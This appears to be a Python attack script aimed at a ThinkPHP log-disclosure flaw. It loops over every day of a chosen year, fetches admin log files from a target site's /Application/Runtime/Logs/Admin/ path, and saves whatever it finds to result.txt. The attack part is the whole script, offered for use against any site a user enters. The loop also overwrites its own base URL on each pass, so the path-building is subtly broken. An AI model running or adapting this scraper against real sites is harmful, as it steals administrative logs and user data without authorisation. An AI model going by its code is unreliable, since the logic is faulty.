# Author: Tommonkey
# Data: 2023/1/12
# Version: python3

import requests
import time

banner = """
-------------------------------------------------

   ___     _  _____               __             
  / _ \___| |/__   \_ __         / /  ___   __ _ 
 / /_\/ _ \ __|/ /\/ '_ \ _____ / /  / _ \ / _` |
/ /_\\  __/ |_/ /  | |_) |_____/ /__| (_) | (_| |
\____/\___|\__\/   | .__/      \____/\___/ \__, |
                   |_|                     |___/ 

                            -----Author:Tommonkey
[+]usage: python3 getTp-log.py
-------------------------------------------------
"""

headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36"
    }

mou_list = ['01','02','03','04','05','06','07','08','09','10','11','12']
day_list = ['01','02','03','04','05','06','07','08','09','10','11','12','13','14','15','16','17','18','19','20','21','22','23','24','25','26','27','28','29','30','31']

def getPacage(year,url):
    try:
        for mouth in mou_list:
            print('正在尝试读取{}年{}月日志数据…………'.format(year,mouth))
            for day in day_list:
                # 针对tp的日志泄露漏洞，
                url = "{}/Application/Runtime/Logs/Admin/{}_{}_{}.log".format(url,year,mouth,day)
                package_date = requests.get(url=url,headers=headers)
                if package_date.status_code == 200:
                    package_date = package_date.text
                    with open(r'./result.txt','a+',encoding='utf-8') as wf:
                        wf.write(package_date)
                        print('{}年{}月{}日，日志数据入库成功'.format(year,mouth,day))
                time.sleep(0.8)
        print("读取完毕！")
    except Exception as err:
        print("处理异常:{}".format(err))


if __name__ == "__main__":
    print(banner)
    year = input("请输入开始读取日志的时间节点(建议读取近两年数据，如现在是2022年，则此处输入：2020)：")
    url = input("请输入目标站点(如：https://tommonkey.cn)：")
    getPacage(year,url)
